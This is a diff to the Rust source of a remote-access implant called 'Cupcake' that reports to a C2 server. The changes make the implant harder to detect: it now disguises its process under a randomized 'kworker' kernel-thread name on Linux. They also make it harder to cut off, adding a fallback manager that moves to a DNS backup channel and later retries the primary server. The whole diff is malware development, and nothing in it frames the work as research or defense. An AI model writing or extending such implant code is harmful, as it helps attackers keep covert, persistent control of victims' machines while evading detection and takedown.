@@ -102,9 +102,11 @@ fn main() {
     }
 
     // 9. Backgrounding and Name Spoofing (Linux)
+    // 🛡️ Phase 1 Enhancement: Use randomized kworker name instead of fixed name
     #[cfg(target_os = "linux")]
     {
-        stealth::spoof_process_name("kworker/u2:1-events");
+        // Use empty string to trigger random name generation
+        stealth::spoof_process_name("");
     }
 
     // 11. Spawn agent runtime thread
@@ -208,39 +210,106 @@ async fn run_websocket_mode() -> Result<()> {
     use cupcake_core::config::{get_server_url, validate_server_url};
     use cupcake_core::transport::create_transport;
     use cupcake_core::{ClientError, Transport};
-    
+    use cupcake_core::fallback::{FallbackManager, FallbackState};
+
     let server_url = get_server_url();
     // println!("[*] Target C2 Server: {}", server_url);
-    
+
     if !validate_server_url(&server_url) {
         return Err(ClientError::ConnectionError("invalid_target".to_string()));
     }
-    
+
     let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
         Ok(t) => t,
         Err(e) => return Err(e),
     };
-    
+
+    // 🛡️ Phase 3: Initialize Fallback Manager
+    let mut fallback = FallbackManager::new();
+
     // 使用指数退避重连策略（1s -> 2s -> 4s -> ... -> 60s）
     let mut backoff = cupcake_core::ExponentialBackoff::new();
-    
+
     loop {
+        // 🛡️ Phase 3: Check fallback state and adapt
+        let current_url = match fallback.state() {
+            FallbackState::Primary => server_url.clone(),
+            FallbackState::DnsBackup => {
+                if let Some(dns_url) = fallback.switch_to_fallback() {
+                    dns_url
+                } else {
+                    server_url.clone()
+                }
+            }
+            FallbackState::WaitingRecovery => {
+                // Wait before recovery attempt
+                let recovery_delay = fallback.recovery_delay_secs();
+                log::info!("[Cupcake] Waiting {}s before recovery attempt", recovery_delay);
+                tokio::time::sleep(tokio::time::Duration::from_secs(recovery_delay)).await;
+
+                if let Some(primary_url) = fallback.attempt_recovery() {
+                    // Recreate transport for recovery
+                    match create_transport(&primary_url) {
+                        Ok(t) => {
+                            transport = t;
+                            primary_url
+                        }
+                        Err(_) => {
+                            continue;
+                        }
+                    }
+                } else {
+                    server_url.clone()
+                }
+            }
+        };
+
         if let Err(_e) = transport.connect().await {
-            // 连接失败：使用指数退避等待，防止固定间隔被流量分析识别
+            // 🛡️ Phase 3: Primary failed - try fallback
+            if fallback.state() == FallbackState::Primary {
+                if let Some(fallback_url) = fallback.switch_to_fallback() {
+                    #[cfg(feature = "dns")]
+                    {
+                        log::info!("[Cupcake] Switching to DNS backup channel");
+                        match create_transport(&fallback_url) {
+                            Ok(t) => {
+                                transport = t;
+                                backoff.reset();
+                                continue;
+                            }
+                            Err(_) => {
+                                log::warn!("[Cupcake] Fallback channel also failed");
+                            }
+                        }
+                    }
+                }
+            }
+
+            // 连接失败：使用指数退避等待
             tokio::time::sleep(backoff.next_delay()).await;
             continue;
         }
-        
+
+        // 🛡️ Phase 3: Mark as recovered if on primary
+        if fallback.state() == FallbackState::Primary {
+            fallback.mark_recovered();
+        }
+
         // 连接成功：重置退避计时器
         backoff.reset();
-        
+
         let handler = cupcake_core::BatchMessageHandler::new(transport, None);
         match handler.run().await {
             Ok(returned_transport) => {
                 transport = returned_transport;
+                // Connection dropped but recovered - mark primary as recovered
+                fallback.mark_recovered();
             }
             Err(_e) => {
-                match create_transport(&server_url) {
+                // 🛡️ Phase 3: Session error - may need fallback
+                fallback.switch_to_fallback();
+
+                match create_transport(&current_url) {
                     Ok(t) => transport = t,
                     Err(e) => return Err(e),
                 }
